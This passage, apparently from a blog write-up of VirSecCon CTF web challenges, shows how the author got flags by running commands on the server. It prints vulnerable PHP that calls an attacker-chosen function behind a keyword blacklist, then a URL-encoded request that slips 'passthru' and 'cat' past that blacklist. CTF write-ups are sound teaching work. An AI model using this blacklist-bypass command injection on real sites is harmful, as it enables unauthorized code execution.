<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">total 16 dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php 
</code></pre></td></tr></table>
</div>
</div><p>So got the final flag using <code>system('cat flag_name_dont_guess_plz');</code></p>
<blockquote>
<p><code>LLS{php_preg_replace_may_be_dangerous} </code></p>
</blockquote>
<h3 id="12-get-encoded">12. GET Encoded</h3>
<h4 id="description-125">Description [125]</h4>
<p>I don&rsquo;t GET this%21 Do you%3F</p>
<p>Connect here: <a href="http://jh2i.com:50013">http://jh2i.com:50013</a></p>
<p><strong>Solution</strong>:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/robots_virseccon.jpg"
        data-srcset="/virsecctf_web/public/images/robots_virseccon.jpg, public/images/robots_virseccon.jpg 1.5x, /virsecctf_web/public/images/robots_virseccon.jpg 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/robots_virseccon.jpg"
        title="robots.txt" /></p>
<p>then I visited that dir <code>http://jh2i.com:50013/?debug</code> and got the code below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">?php

    function debug(){
        highlight_file(__FILE__);

    }
    

    // I hate these functions, they are so insecure!
    $blacklist = &#34;assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob&#34;;


    // If you supply GET arguments, process them...
    // Documentation here: http://php.net/manual/en/reserved.variables.get.php
    if ( count( $_GET ) &gt; 0 ){

        // Check if there are any bad functions in the URL supplied
        if ( preg_match( &#34;/$blacklist/i&#34;, $_SERVER[&#39;REQUEST_URI&#39;] ) ) {

            // If there are all, kindly tell them off. ;)
            // Documentation here: http://php.net/manual/en/reserved.variables.server.php
            die( &#34;Go away, hacker! No unsafe functions in \$_SERVER[&#39;REQUEST_URI&#39;]!!&#34; );
        
        }else{

            // Otherwise, execute code as a usual debugging interface.
            // Pull them out of the GET array as `variable=value` format...
            list( $function, $argument ) = each($_GET);

            // and call what they supply...
            // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN&#39;T INCLUDE `/?debug`
            echo(&#34;&lt;pre&gt;&#34;);
            $function($argument);
            echo(&#34;&lt;/pre&gt;&#34;);
        }

    }
    
    echo(&#34;&lt;p&gt;Machines hunt for more than humans do.&lt;/p&gt;&#34;);
</code></pre></td></tr></table>
</div>
</div><p>So I sent a request with url encoding technique you see <a href="https://www.eso.org/~ndelmott/url_encode.html" target="_blank" rel="noopener noreffer">here</a> <code>?passthru=cat flag_that_you_could_never_guess.php</code>  but not decoded the <code>=</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/getencodedflag_virseccon.png"
        data-srcset="/virsecctf_web/public/images/getencodedflag_virseccon.png, public/images/getencodedflag_virseccon.png 1.5x, /virsecctf_web/public/images/getencodedflag_virseccon.png 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/getencodedflag_virseccon.png"
        title="flag" /></p>
<p>This way I solved the challenge.</p>
<p>This way I was able to solve all challenges from web category except the last one.</p>
<p>I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups</p>
<p>#Stay_Safe</p>
<p>#COVID-19</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2020-04-17</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/virsecctf_web/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/virsecctf_web/" data-title="VirSecCon CTF &#34;Web Challenges&#34;" data-via="gr4n173" data-hashtags="linux,virseccon,ctf,webchallenge,SSTI,PhpJuggler"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/virsecctf_web/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/virsecctf_web/" data-title="VirSecCon CTF &#34;Web Challenges&#34;"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/virsecctf_web/" data-title="VirSecCon CTF &#34;Web Challenges&#34;"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/virsecctf_web/" data-title="VirSecCon CTF &#34;Web Challenges&#34;"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/virseccon/">VirSecCon</a>,&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/webchallenge/">webchallenge</a>,&nbsp;<a href="/tags/ssti/">SSTI</a>,&nbsp;<a href="/tags/phpjuggler/">PhpJuggler</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/virsecctf_scripting/" class="prev" rel="prev" title="VirSecCon CTF &#34;Scripting Challenges&#34;"><i class="fas fa-angle-left fa-fw"></i>VirSecCon CTF &#34;Scripting Challenges&#34;</a>
            <a href="/mango/" class="next" rel="next" title="Mango">Mango<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
